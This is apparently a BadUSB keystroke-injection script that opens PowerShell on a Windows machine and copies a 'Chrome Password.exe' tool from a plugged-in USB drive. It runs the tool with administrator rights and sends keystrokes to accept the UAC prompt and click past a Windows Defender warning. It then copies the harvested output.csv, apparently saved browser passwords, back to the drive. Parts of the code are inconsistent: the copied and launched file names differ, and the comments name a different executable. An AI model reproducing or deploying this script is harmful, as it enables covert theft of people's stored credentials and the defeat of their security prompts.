layout('us');             // Use US keyboard layout
typingSpeed(0, 0);        // Set typing speed to fastest

press("GUI r");           // Open Run dialog
delay(1000);              
type("powershell\n");     // Open PowerShell
delay(2000);              

// Detect USB drive
type('$usbDrive = (Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -ExpandProperty DeviceID);\n');
delay(1000);              

type('if ($usbDrive -ne $null) {\n');  
delay(1000);

type('  $usbDrivePath = $usbDrive + "\\";\n');
delay(1000);

type('  Copy-Item "$usbDrivePath\\Chrome Password.exe" -Destination "$env:USERPROFILE\\Desktop\\aChrome Password.exe" -Force;\n');
delay(2000);              

// Set working directory & run allpy.exe with Admin Privileges
type('  Start-Process -FilePath "$env:USERPROFILE\\Desktop\\Chrome Password.exe" -WorkingDirectory "$env:USERPROFILE\\Desktop" -Verb RunAs;\n');
delay(2000);  
type('  }\n');
// Handle UAC Prompt
delay(15000);

press("TAB");             // Ensure "Yes" is selected
delay(1000);
press("TAB");             // Ensure "Yes" is selected
delay(1000);
press("ENTER");           // Confirm admin access

// Wait for allpy.exe execution
delay(30000);             // Increased wait time for execution

// Handle Windows Defender "Run Anyway" prompt
press("TAB");             
delay(1000);
press("TAB");             
delay(1000);
press("ENTER");           

// Wait for output file generation
delay(1000);            

// Check if output.csv exists before copying
type('  if (Test-Path "$env:USERPROFILE\\Desktop\\output.csv") {\n');
delay(1000);
type('      Copy-Item "$env:USERPROFILE\\Desktop\\output.csv" -Destination "$usbDrivePath\\output.csv" -Force;\n');
delay(2000);
type('  } else {\n');
type('      Write-Host "Error: output.csv not found!";\n');


type('}\n');  

// End of script
